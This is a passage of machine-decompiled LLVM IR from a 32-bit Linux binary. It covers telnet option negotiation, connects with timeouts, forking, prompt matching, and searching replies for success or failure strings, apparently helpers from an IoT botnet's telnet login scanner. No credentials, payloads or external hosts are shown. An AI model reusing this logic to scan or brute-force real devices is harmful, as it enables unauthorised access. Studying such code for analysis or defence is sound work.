  ret i32 %v4_804921c
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %v4_8049237 = call i32 @contains_string(i32 %arg1, i32* bitcast ([7 x i8*]* @global_var_80581a0.30 to i32*))
  ret i32 %v4_8049237
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804924d = call i32 @contains_success(i32 %arg1)
  %v1_8049255 = icmp eq i32 %v1_804924d, 0
  %v1_8049257 = icmp eq i1 %v1_8049255, false
  br i1 %v1_8049257, label %dec_label_pc_804927b, label %dec_label_pc_8049259

dec_label_pc_8049259:                             ; preds = %entry
  %v1_804925f = call i32 @contains_fail(i32 %arg1)
  %v1_8049267 = icmp ne i32 %v1_804925f, 0
  %. = zext i1 %v1_8049267 to i32
  br label %dec_label_pc_804927b

dec_label_pc_804927b:                             ; preds = %dec_label_pc_8049259, %entry
  %storemerge = phi i32 [ 1, %entry ], [ %., %dec_label_pc_8049259 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_8049280 = load i32, i32* @ebp, align 4
  store i32 %v0_8049280, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804929b

dec_label_pc_804929b:                             ; preds = %dec_label_pc_804929b, %entry
  %stack_var_-12.0 = phi i32 [ 0, %entry ], [ %v4_804929b, %dec_label_pc_804929b ]
  %v4_804929b = add i32 %stack_var_-12.0, 1
  %v2_80492a1 = mul i32 %v4_804929b, 4
  %v5_80492a4 = add i32 %v2_80492a1, %tmp5
  %v1_80492a7 = inttoptr i32 %v5_80492a4 to i32*
  %v2_80492a7 = load i32, i32* %v1_80492a7, align 4
  %v1_80492a9 = icmp eq i32 %v2_80492a7, 0
  %v1_80492ab = icmp eq i1 %v1_80492a9, false
  br i1 %v1_80492ab, label %dec_label_pc_804929b, label %dec_label_pc_80492e0.preheader

dec_label_pc_80492e0.preheader:                   ; preds = %dec_label_pc_804929b
  %v2_80492c8 = inttoptr i32 %arg1 to i8*
  %v5_80492e616 = icmp sgt i32 %v4_804929b, 0
  br i1 %v5_80492e616, label %dec_label_pc_80492b6.lr.ph, label %dec_label_pc_80492ef

dec_label_pc_80492b6.lr.ph:                       ; preds = %dec_label_pc_80492e0.preheader
  br label %dec_label_pc_80492b6

dec_label_pc_80492b6:                             ; preds = %dec_label_pc_80492b6.lr.ph, %dec_label_pc_80492dd
  %storemerge117 = phi i32 [ 0, %dec_label_pc_80492b6.lr.ph ], [ %v4_80492dd, %dec_label_pc_80492dd ]
  %v2_80492b9 = mul i32 %storemerge117, 4
  %v5_80492bc = add i32 %v2_80492b9, %tmp5
  %v1_80492bf = inttoptr i32 %v5_80492bc to i32*
  %v2_80492bf = load i32, i32* %v1_80492bf, align 4
  store i32 %v2_80492bf, i32* @eax, align 4
  %v3_80492c8 = call i32 @strcasestr(i8* %v2_80492c8, i32 %v2_80492bf)
  %v1_80492d0 = icmp eq i32 %v3_80492c8, 0
  br i1 %v1_80492d0, label %dec_label_pc_80492dd, label %dec_label_pc_80492ef

dec_label_pc_80492dd:                             ; preds = %dec_label_pc_80492b6
  %v4_80492dd = add nuw nsw i32 %storemerge117, 1
  %v5_80492e6 = icmp slt i32 %v4_80492dd, %v4_804929b
  br i1 %v5_80492e6, label %dec_label_pc_80492b6, label %dec_label_pc_80492ef

dec_label_pc_80492ef:                             ; preds = %dec_label_pc_80492b6, %dec_label_pc_80492dd, %dec_label_pc_80492e0.preheader
  %storemerge = phi i32 [ 0, %dec_label_pc_80492e0.preheader ], [ 0, %dec_label_pc_80492dd ], [ 1, %dec_label_pc_80492b6 ]
  %v2_80492f2 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80492f2, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge117, { 1, 0 }
  uselistorder i32 %v4_804929b, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_80492ef, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80492b6, { 1, 0 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_80492f7 = load i32, i32* @edi, align 4
  %v3_8049308 = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_8049313 = or i32 %v3_8049308, 2048
  %v3_8049325 = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_8049313)
  store i32 2, i32* %stack_var_-40, align 4
  %v1_8049336 = urem i32 %arg3, 65536
  %v1_804933f = call i32 @htons(i32 %v1_8049336)
  store i32 %arg2, i32* @edx, align 4
  %v3_8049359 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-36)
  %v1_8049361 = icmp eq i32 %v3_8049359, 0
  br i1 %v1_8049361, label %dec_label_pc_8049374, label %dec_label_pc_8049365

dec_label_pc_8049365:                             ; preds = %entry
  br label %dec_label_pc_80494b1

dec_label_pc_8049374:                             ; preds = %entry
  %v2_8049351 = ptrtoint i32* %stack_var_-40 to i32
  %v3_8049393 = call i32 @__libc_connect(i32 %arg1, i32 %v2_8049351, i32 16)
  %v5_804939e = icmp slt i32 %v3_8049393, 0
  %v1_80493a2 = icmp eq i1 %v5_804939e, false
  br i1 %v1_80493a2, label %dec_label_pc_8049478, label %dec_label_pc_80493a8

dec_label_pc_80493a8:                             ; preds = %dec_label_pc_8049374
  %v1_80493a8 = call i32 @__errno_location(i32 %v3_8049393)
  %v1_80493ad = inttoptr i32 %v1_80493a8 to i32*
  %v2_80493ad = load i32, i32* %v1_80493ad, align 4
  %v9_80493af = icmp eq i32 %v2_80493ad, 115
  %v1_80493b2 = icmp eq i1 %v9_80493af, false
  br i1 %v1_80493b2, label %dec_label_pc_804946c, label %dec_label_pc_80493b8

dec_label_pc_80493b8:                             ; preds = %dec_label_pc_80493a8
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_80493d5 = ptrtoint i32* %stack_var_-168 to i32
  %tmp32 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_80493d5, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_80493dc = call i8* @_memset(i8* %tmp32, i32 0, i32 32)
  %v2_80493e9 = udiv i32 %arg1, 32
  %v1_80493ef = urem i32 %arg1, 32
  %v0_80493f2 = load i32, i32* @ebp, align 4
  %v2_80493f2 = mul nuw nsw i32 %v2_80493e9, 4
  %v3_80493f2 = add nsw i32 %v2_80493f2, -164
  %v4_80493f2 = add i32 %v3_80493f2, %v0_80493f2
  %v5_80493f2 = inttoptr i32 %v4_80493f2 to i32*
  %v6_80493f2 = load i32, i32* %v5_80493f2, align 4
  %v9_80493f2 = shl i32 1, %v1_80493ef
  %v12_80493f2 = or i32 %v6_80493f2, %v9_80493f2
  store i32 %v12_80493f2, i32* %v5_80493f2, align 4
  %v1_80493fd = add i32 %arg1, 1
  %v2_8049401 = ptrtoint i32* %stack_var_-176 to i32
  %v5_8049414 = call i32 @__libc_select(i32 %v1_80493fd, i32 0, i32 %v2_80493d5, i32 0, i32 %v2_8049401)
  %tmp33 = icmp slt i32 %v5_8049414, 1
  br i1 %tmp33, label %dec_label_pc_8049460, label %dec_label_pc_8049420

dec_label_pc_8049420:                             ; preds = %dec_label_pc_80493b8
  store i32 4, i32* %stack_var_-180, align 4
  %v2_804942d = ptrtoint i32* %stack_var_-180 to i32
  %v2_8049434 = ptrtoint i32* %stack_var_-184 to i32
  %v5_8049442 = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_8049434, i32 %v2_804942d)
  %v3_804944a = load i32, i32* %stack_var_-184, align 4
  %v1_8049450 = icmp eq i32 %v3_804944a, 0
  br i1 %v1_8049450, label %dec_label_pc_8049478, label %dec_label_pc_8049454

dec_label_pc_8049454:                             ; preds = %dec_label_pc_8049420
  br label %dec_label_pc_80494b1

dec_label_pc_8049460:                             ; preds = %dec_label_pc_80493b8
  br label %dec_label_pc_80494b1

dec_label_pc_804946c:                             ; preds = %dec_label_pc_80493a8
  br label %dec_label_pc_80494b1

dec_label_pc_8049478:                             ; preds = %dec_label_pc_8049420, %dec_label_pc_8049374
  %v3_8049482 = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_804948d = and i32 %v3_8049482, -2049
  %v3_804949f = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_804948d)
  br label %dec_label_pc_80494b1

dec_label_pc_80494b1:                             ; preds = %dec_label_pc_804946c, %dec_label_pc_8049460, %dec_label_pc_8049454, %dec_label_pc_8049365, %dec_label_pc_8049478
  %v3_80494b1 = phi i32 [ 0, %dec_label_pc_804946c ], [ 0, %dec_label_pc_8049460 ], [ 0, %dec_label_pc_8049454 ], [ 0, %dec_label_pc_8049365 ], [ 1, %dec_label_pc_8049478 ]
  store i32 %v0_80492f7, i32* @edi, align 4
  ret i32 %v3_80494b1

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0 }
  uselistorder i32 %arg1, { 8, 7, 6, 5, 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_80494b1, { 4, 0, 1, 2, 3 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_80494bf = load i32, i32* @ebx, align 4
  store i32 %v0_80494bf, i32* %stack_var_-8, align 4
  %v1_80494c3 = call i32 @__libc_fork(i32 %v0_80494bf)
  %v4_80494cb = icmp eq i32 %v1_80494c3, 0
  %v1_80494cf = icmp eq i1 %v4_80494cb, false
  br i1 %v1_80494cf, label %dec_label_pc_80494dc, label %dec_label_pc_80494d1

dec_label_pc_80494d1:                             ; preds = %entry
  br label %dec_label_pc_80495c0

dec_label_pc_80494dc:                             ; preds = %entry
  %v0_80494dc = load i32, i32* @global_var_80584c8.31, align 8
  %v0_80494e1 = load i32, i32* @global_var_80584cc.32, align 4
  %v1_80494e7 = add i32 %v0_80494dc, 1
  %v5_80494e7 = icmp eq i32 %v0_80494dc, -1
  %v2_80494ea = zext i1 %v5_80494e7 to i32
  %v3_80494ea = add i32 %v2_80494ea, %v0_80494e1
  store i32 %v1_80494e7, i32* @global_var_80584c8.31, align 8
  store i32 %v3_80494ea, i32* @global_var_80584cc.32, align 4
  %v2_8049507 = mul i32 %v1_80494e7, 4
  %v1_804950a = add i32 %v2_8049507, 4
  %v1_8049511 = call i32 @malloc(i32 %v1_804950a)
  br label %dec_label_pc_8049547

dec_label_pc_8049525:                             ; preds = %dec_label_pc_8049547, %dec_label_pc_8049578
  %v2_8049528 = mul i32 %storemerge1, 4
  %v5_804952d = add i32 %v2_8049528, %v1_8049511
  %v0_8049538 = load i32, i32* @global_var_805e754.33, align 4
  %v2_804953d = add i32 %v0_8049538, %v2_8049528
  %v1_8049540 = inttoptr i32 %v2_804953d to i32*
  %v2_8049540 = load i32, i32* %v1_8049540, align 4
  %v2_8049542 = inttoptr i32 %v5_804952d to i32*
  store i32 %v2_8049540, i32* %v2_8049542, align 4
  %v4_8049544 = add i32 %storemerge1, 1
  br label %dec_label_pc_8049547

dec_label_pc_8049547:                             ; preds = %dec_label_pc_80494dc, %dec_label_pc_8049525
  %storemerge1 = phi i32 [ %v4_8049544, %dec_label_pc_8049525 ], [ 0, %dec_label_pc_80494dc ]
  %v0_8049555 = load i32, i32* @global_var_80584c8.31, align 8
  %v0_804955a = load i32, i32* @global_var_80584cc.32, align 4
  %v4_8049564 = icmp ne i32 %v0_8049555, 0
  %v2_8049567 = zext i1 %v4_8049564 to i32
  %v3_8049567 = add i32 %v0_804955a, -1
  %v4_8049567 = add i32 %v3_8049567, %v2_8049567
  store i32 %v4_8049567, i32* @ebx, align 4
  %v10_8049573 = icmp eq i32 %v4_8049567, 0
  br i1 %v10_8049573, label %dec_label_pc_8049578, label %dec_label_pc_8049525

dec_label_pc_8049578:                             ; preds = %dec_label_pc_8049547
  %v1_8049564 = add i32 %v0_8049555, -1
  %v10_8049583 = icmp ult i32 %storemerge1, %v1_8049564
  br i1 %v10_8049583, label %dec_label_pc_8049525, label %dec_label_pc_8049588

dec_label_pc_8049588:                             ; preds = %dec_label_pc_8049578
  %v2_8049593 = mul i32 %v0_8049555, 4
  %v5_8049596 = add i32 %v1_8049511, -4
  %v1_8049599 = add i32 %v5_8049596, %v2_8049593
  store i32 %v1_8049599, i32* @edx, align 4
  %v2_804959f = inttoptr i32 %v1_8049599 to i32*
  store i32 %v1_80494c3, i32* %v2_804959f, align 4
  %v0_80495a1 = load i32, i32* @global_var_805e754.33, align 4
  %v1_80495aa = call i32 @free(i32 %v0_80495a1)
  store i32 %v1_8049511, i32* @global_var_805e754.33, align 4
  store i32 %v1_80494c3, i32* @ecx, align 4
  br label %dec_label_pc_80495c0

dec_label_pc_80495c0:                             ; preds = %dec_label_pc_80494d1, %dec_label_pc_8049588
  %v3_80495c3 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_80495c3, i32* @ebx, align 4
  ret i32 %v1_80494c3

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 0, 2 }
  uselistorder i32 %v2_8049528, { 1, 0 }
  uselistorder i32 %v1_8049511, { 2, 0, 1 }
  uselistorder i32 %v0_80494dc, { 1, 0 }
  uselistorder label %dec_label_pc_80495c0, { 1, 0 }
  uselistorder label %dec_label_pc_8049547, { 1, 0 }
  uselistorder label %dec_label_pc_8049525, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80495c8 = load i32, i32* @ebp, align 4
  store i32 %v0_80495c8, i32* %stack_var_-4, align 4
  %v1_80495d1 = add i32 %arg2, 1
  %v1_80495d2 = inttoptr i32 %v1_80495d1 to i8*
  %v2_80495d2 = load i8, i8* %v1_80495d2, align 1
  %v5_80495d2 = and i32 %v1_80495d1, -256
  %v9_80495de = icmp ult i8 %v2_80495d2, -5
  br i1 %v9_80495de, label %dec_label_pc_80496be, label %dec_label_pc_80495eb

dec_label_pc_80495eb:                             ; preds = %entry
  %v7_80495f2 = icmp eq i8 %v2_80495d2, -1
  br i1 %v7_80495f2, label %dec_label_pc_80495f4, label %dec_label_pc_804960e

dec_label_pc_80495f4:                             ; preds = %dec_label_pc_80495eb
  br label %dec_label_pc_80496be

dec_label_pc_804960e:                             ; preds = %dec_label_pc_80495eb
  store i32 -1, i32* %stack_var_-5, align 4
  %v2_8049619 = ptrtoint i32* %stack_var_-5 to i32
  %v4_8049620 = call i32 @__libc_send(i32 %arg1, i32 %v2_8049619, i32 1, i32 16384)
  %v2_804962c = load i8, i8* %v1_80495d2, align 1
  %v11_804962e = icmp eq i8 %v2_804962c, -4
  %v1_8049630 = icmp eq i1 %v11_804962e, false
  br i1 %v1_8049630, label %dec_label_pc_8049638, label %dec_label_pc_8049632

dec_label_pc_8049632:                             ; preds = %dec_label_pc_804960e
  store i32 -2, i32* %stack_var_-5, align 4
  br label %dec_label_pc_8049688

dec_label_pc_8049638:                             ; preds = %dec_label_pc_804960e
  %v2_804963c = load i8, i8* %v1_80495d2, align 1
  %v11_804963e = icmp eq i8 %v2_804963c, -2
  %v1_8049640 = icmp eq i1 %v11_804963e, false
  br i1 %v1_8049640, label %dec_label_pc_8049648, label %dec_label_pc_8049642

dec_label_pc_8049642:                             ; preds = %dec_label_pc_8049638
  store i32 -4, i32* %stack_var_-5, align 4
  br label %dec_label_pc_8049688

dec_label_pc_8049648:                             ; preds = %dec_label_pc_8049638
  %v2_804964c = load i8, i8* %v1_80495d2, align 1
  %v10_804964e = icmp eq i8 %v2_804964c, 3
  %v1_8049650 = icmp eq i1 %v10_804964e, false
  %v11_8049674 = icmp eq i8 %v2_804964c, -3
  %v1_8049676 = icmp eq i1 %v11_8049674, false
  br i1 %v1_8049650, label %dec_label_pc_804966e, label %dec_label_pc_8049652

dec_label_pc_8049652:                             ; preds = %dec_label_pc_8049648
  %. = select i1 %v1_8049676, i32 253, i32 251
  %v7_8049666 = or i32 %., %v5_80495d2
  store i32 %v7_8049666, i32* %stack_var_-5, align 4
  br label %dec_label_pc_8049688

dec_label_pc_804966e:                             ; preds = %dec_label_pc_8049648
  %.2 = select i1 %v1_8049676, i32 254, i32 252
  %v5_8049682 = load i32, i32* @edx, align 4
  %v6_8049682 = and i32 %v5_8049682, -256
  %v7_8049682 = or i32 %v6_8049682, %.2
  store i32 %v7_8049682, i32* %stack_var_-5, align 4
  br label %dec_label_pc_8049688

dec_label_pc_8049688:                             ; preds = %dec_label_pc_8049652, %dec_label_pc_8049642, %dec_label_pc_8049632, %dec_label_pc_804966e
  %v4_8049696 = call i32 @__libc_send(i32 %arg1, i32 %v2_8049619, i32 1, i32 16384)
  %v1_80496a1 = add i32 %arg2, 2
  %v4_80496af = call i32 @__libc_send(i32 %arg1, i32 %v1_80496a1, i32 1, i32 16384)
  %v2_80496c1.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80496be

dec_label_pc_80496be:                             ; preds = %dec_label_pc_80495f4, %dec_label_pc_8049688, %entry
  %v2_80496c1 = phi i32 [ %v0_80495c8, %dec_label_pc_80495f4 ], [ %v2_80496c1.pre, %dec_label_pc_8049688 ], [ %v0_80495c8, %entry ]
  store i32 %v2_80496c1, i32* @ebp, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32* %stack_var_-5, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80496be, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049688, { 3, 0, 1, 2 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %v4_80496d1 = ptrtoint i8* %arg1 to i32
  %v3_80496e2 = call i32 @_strlen(i8* %arg1)
  %v4_80496e2 = mul i32 %v3_80496e2, -1
  %v1_80496e8 = sub i32 0, %v4_80496e2
  %v6_804970f = sub i32 %v4_80496d1, %v4_80496e2
  br label %dec_label_pc_8049791

dec_label_pc_80496ff:                             ; preds = %dec_label_pc_804974f, %dec_label_pc_8049738, %dec_label_pc_8049721, %dec_label_pc_804970a
  %v4_80496ff = add nsw i32 %stack_var_-12.025, 1
  %v7_8049708 = icmp slt i32 %v4_80496ff, %v1_80496e8
  br i1 %v7_8049708, label %dec_label_pc_804970a, label %dec_label_pc_8049702.dec_label_pc_8049766_crit_edge

dec_label_pc_8049702.dec_label_pc_8049766_crit_edge: ; preds = %dec_label_pc_80496ff, %dec_label_pc_8049702.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %stack_var_-12.1, %dec_label_pc_8049702.preheader ], [ %v4_80496ff, %dec_label_pc_80496ff ]
  %.pre = sub i32 %v6_804970f, %stack_var_-12.0.lcssa
  %.pre9 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_8049766

dec_label_pc_804970a:                             ; preds = %dec_label_pc_8049702.preheader, %dec_label_pc_80496ff
  %stack_var_-12.025 = phi i32 [ %v4_80496ff, %dec_label_pc_80496ff ], [ %stack_var_-12.1, %dec_label_pc_8049702.preheader ]
  %v2_8049717 = sub i32 %v6_804970f, %stack_var_-12.025
  %v1_804971b = inttoptr i32 %v2_8049717 to i8*
  %v2_804971b = load i8, i8* %v1_804971b, align 1
  %v4_804971d = icmp eq i8 %v2_804971b, 0
  br i1 %v4_804971d, label %dec_label_pc_80496ff, label %dec_label_pc_8049721

dec_label_pc_8049721:                             ; preds = %dec_label_pc_804970a
  %v2_8049732 = load i8, i8* %v1_804971b, align 1
  %v7_8049734 = icmp eq i8 %v2_8049732, 32
  br i1 %v7_8049734, label %dec_label_pc_80496ff, label %dec_label_pc_8049738

dec_label_pc_8049738:                             ; preds = %dec_label_pc_8049721
  %v2_8049749 = load i8, i8* %v1_804971b, align 1
  %v10_804974b = icmp eq i8 %v2_8049749, 13
  br i1 %v10_804974b, label %dec_label_pc_80496ff, label %dec_label_pc_804974f

dec_label_pc_804974f:                             ; preds = %dec_label_pc_8049738
  %v2_8049760 = load i8, i8* %v1_804971b, align 1
  %v10_8049762 = icmp eq i8 %v2_8049760, 10
  br i1 %v10_8049762, label %dec_label_pc_80496ff, label %dec_label_pc_8049766

dec_label_pc_8049766:                             ; preds = %dec_label_pc_804974f, %dec_label_pc_8049702.dec_label_pc_8049766_crit_edge
  %stack_var_-12.021 = phi i32 [ %stack_var_-12.0.lcssa, %dec_label_pc_8049702.dec_label_pc_8049766_crit_edge ], [ %stack_var_-12.025, %dec_label_pc_804974f ]
  %v1_8049777.pre-phi = phi i8* [ %.pre9, %dec_label_pc_8049702.dec_label_pc_8049766_crit_edge ], [ %v1_804971b, %dec_label_pc_804974f ]
  %v2_8049777 = load i8, i8* %v1_8049777.pre-phi, align 1
  %v6_804977c = add i32 %storemerge2, ptrtoint ([6 x i8]* @global_var_8055760.34 to i32)
  %v1_804977f = inttoptr i32 %v6_804977c to i8*
  %v2_804977f = load i8, i8* %v1_804977f, align 1
  %v15_8049781 = icmp eq i8 %v2_8049777, %v2_804977f
  %v1_8049783 = icmp eq i1 %v15_8049781, false
  br i1 %v1_8049783, label %dec_label_pc_804978e, label %dec_label_pc_80497bb

dec_label_pc_804978e:                             ; preds = %dec_label_pc_8049766
  %v4_804978e = add i32 %storemerge2, 1
  br label %dec_label_pc_8049791

dec_label_pc_8049791:                             ; preds = %entry, %dec_label_pc_804978e
  %stack_var_-12.1 = phi i32 [ 0, %entry ], [ %stack_var_-12.021, %dec_label_pc_804978e ]
  %storemerge2 = phi i32 [ 0, %entry ], [ %v4_804978e, %dec_label_pc_804978e ]
  %v3_80497a5 = call i32 @_strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8055760.34, i32 0, i32 0))
  %v7_80497ac = icmp ult i32 %storemerge2, %v3_80497a5
  br i1 %v7_80497ac, label %dec_label_pc_8049702.preheader, label %dec_label_pc_80497bb

dec_label_pc_8049702.preheader:                   ; preds = %dec_label_pc_8049791
  %v7_804970824 = icmp slt i32 %stack_var_-12.1, %v1_80496e8
  br i1 %v7_804970824, label %dec_label_pc_804970a, label %dec_label_pc_8049702.dec_label_pc_8049766_crit_edge

dec_label_pc_80497bb:                             ; preds = %dec_label_pc_8049791, %dec_label_pc_8049766
  %storemerge = phi i32 [ 1, %dec_label_pc_8049766 ], [ 0, %dec_label_pc_8049791 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-12.1, { 2, 1, 0 }
  uselistorder i32 %v6_804970f, { 1, 0 }
  uselistorder [6 x i8]* @global_var_8055760.34, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049791, { 1, 0 }
  uselistorder label %dec_label_pc_8049702.dec_label_pc_8049766_crit_edge, { 1, 0 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i8* %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_-168, align 4
  %v2_804980a = ptrtoint i32* %stack_var_-160 to i32
  %tmp33 = bitcast i32* %stack_var_-160 to i8*
  %v1_8049824 = urem i32 %arg1, 32
  %v9_8049827 = shl i32 1, %v1_8049824
  %v1_8049832 = add i32 %arg1, 1
  %v2_8049836 = ptrtoint i32* %stack_var_-168 to i32
  %v2_8049905 = inttoptr i32 %arg2 to i8*
  %v4_8049911 = icmp eq i32 %arg3, 0
  %v1_804993240 = add i32 %arg8, 2
  %v5_804993843 = icmp slt i32 %v1_804993240, %arg7
  br i1 %v5_804993843, label %dec_label_pc_804993a.lr.ph, label %dec_label_pc_8049968

dec_label_pc_804993a.lr.ph:                       ; preds = %entry
  %v2_804981e = udiv i32 %arg1, 32
  %v2_8049827 = mul nuw nsw i32 %v2_804981e, 4
  %v3_8049827 = add nsw i32 %v2_8049827, -156
  %v5_804985c = ptrtoint i8* %arg6 to i32
  %tmp38 = icmp slt i32 %arg5, 1
  %tmp39 = icmp eq i1 %tmp38, false
  br label %dec_label_pc_804993a

dec_label_pc_8049800:                             ; preds = %dec_label_pc_8049948, %dec_label_pc_804993a
  store i32 %v2_804980a, i32* @edi, align 4
  %v5_8049811 = call i8* @_memset(i8* %tmp33, i32 0, i32 32)
  %v0_8049827 = load i32, i32* @ebp, align 4
  %v4_8049827 = add i32 %v3_8049827, %v0_8049827
  %v5_8049827 = inttoptr i32 %v4_8049827 to i32*
  %v6_8049827 = load i32, i32* %v5_8049827, align 4
  %v12_8049827 = or i32 %v6_8049827, %v9_8049827
  store i32 %v12_8049827, i32* %v5_8049827, align 4
  %v5_8049849 = call i32 @__libc_select(i32 %v1_8049832, i32 %v2_804980a, i32 0, i32 0, i32 %v2_8049836)
  %tmp35 = icmp slt i32 %v5_8049849, 1
  br i1 %tmp35, label %dec_label_pc_8049968, label %dec_label_pc_8049859

dec_label_pc_8049859:                             ; preds = %dec_label_pc_8049800
  %v6_804985c = add i32 %stack_var_-32.044, %v5_804985c
  %v5_804985f = inttoptr i32 %v6_804985c to i8*
  %v5_804986c = call i32 @__libc_recv(i32 %arg1, i32 %v6_804985c, i32 1, i32 0)
  %v13_8049877 = icmp eq i32 %v5_804986c, -1
  br i1 %v13_8049877, label %dec_label_pc_8049883, label %dec_label_pc_804987d

dec_label_pc_804987d:                             ; preds = %dec_label_pc_8049859
  %v4_804987d = icmp eq i32 %v5_804986c, 0
  %v1_8049881 = icmp eq i1 %v4_804987d, false
  br i1 %v1_8049881, label %dec_label_pc_8049892, label %dec_label_pc_8049883

dec_label_pc_8049883:                             ; preds = %dec_label_pc_804987d, %dec_label_pc_8049859
  br label %dec_label_pc_8049972

dec_label_pc_8049892:                             ; preds = %dec_label_pc_804987d
  %v5_8049895 = add i32 %v5_804986c, %stack_var_-32.044
  %v2_804989b = load i8, i8* %v5_804985f, align 1
  %v11_804989d = icmp eq i8 %v2_804989b, -1
  %v1_804989f = icmp eq i1 %v11_804989d, false
  br i1 %v1_804989f, label %dec_label_pc_80498fc, label %dec_label_pc_80498a1

dec_label_pc_80498a1:                             ; preds = %dec_label_pc_8049892
  %v1_80498a4 = add i32 %v6_804985c, 1
  %v5_80498ad = call i32 @__libc_recv(i32 %arg1, i32 %v1_80498a4, i32 2, i32 0)
  %v13_80498b8 = icmp eq i32 %v5_80498ad, -1
  br i1 %v13_80498b8, label %dec_label_pc_80498c4, label %dec_label_pc_80498be

dec_label_pc_80498be:                             ; preds = %dec_label_pc_80498a1
  %v4_80498be = icmp eq i32 %v5_80498ad, 0
  %v1_80498c2 = icmp eq i1 %v4_80498be, false
  br i1 %v1_80498c2, label %dec_label_pc_80498d3, label %dec_label_pc_80498c4

dec_label_pc_80498c4:                             ; preds = %dec_label_pc_80498be, %dec_label_pc_80498a1
  br label %dec_label_pc_8049972

dec_label_pc_80498d3:                             ; preds = %dec_label_pc_80498be
  %v5_80498d6 = add i32 %v5_80498ad, %v5_8049895
  %v3_80498e4 = call i32 @negotiate(i32 %arg1, i32 %v6_804985c, i32 3)
  %v1_80498ec = icmp eq i32 %v3_80498e4, 0
  %v1_80498ee = icmp eq i1 %v1_80498ec, false
  br i1 %v1_80498ee, label %dec_label_pc_804992f.backedge, label %dec_label_pc_80498f0

dec_label_pc_804992f.backedge:                    ; preds = %dec_label_pc_80498d3, %dec_label_pc_8049911, %dec_label_pc_8049917
  %stack_var_-32.0.be = phi i32 [ %v5_8049895, %dec_label_pc_8049911 ], [ %v5_8049895, %dec_label_pc_8049917 ], [ %v5_80498d6, %dec_label_pc_80498d3 ]
  %v1_8049932 = add i32 %stack_var_-32.0.be, 2
  %v5_8049938 = icmp slt i32 %v1_8049932, %arg7
  br i1 %v5_8049938, label %dec_label_pc_804992f.backedge.dec_label_pc_804993a_crit_edge, label %dec_label_pc_8049968

dec_label_pc_804992f.backedge.dec_label_pc_804993a_crit_edge: ; preds = %dec_label_pc_804992f.backedge
  %v3_804993a.pre = load i32, i32* %stack_var_-168, align 4
  br label %dec_label_pc_804993a

dec_label_pc_80498f0:                             ; preds = %dec_label_pc_80498d3
  br label %dec_label_pc_8049972

dec_label_pc_80498fc:                             ; preds = %dec_label_pc_8049892
  %v3_8049905 = call i32 @strstr(i32 %v5_804985c, i8* %v2_8049905)
  %v1_804990d = icmp eq i32 %v3_8049905, 0
  %v1_804990f = icmp eq i1 %v1_804990d, false
  br i1 %v1_804990f, label %dec_label_pc_804995c, label %dec_label_pc_8049911

dec_label_pc_8049911:                             ; preds = %dec_label_pc_80498fc
  br i1 %v4_8049911, label %dec_label_pc_804992f.backedge, label %dec_label_pc_8049917

dec_label_pc_8049917:                             ; preds = %dec_label_pc_8049911
  %v3_804991a = call i32 @matchPrompt(i8* %arg6)
  %v1_8049922 = icmp eq i32 %v3_804991a, 0
  br i1 %v1_8049922, label %dec_label_pc_804992f.backedge, label %dec_label_pc_804995c

dec_label_pc_804993a:                             ; preds = %dec_label_pc_804992f.backedge.dec_label_pc_804993a_crit_edge, %dec_label_pc_804993a.lr.ph
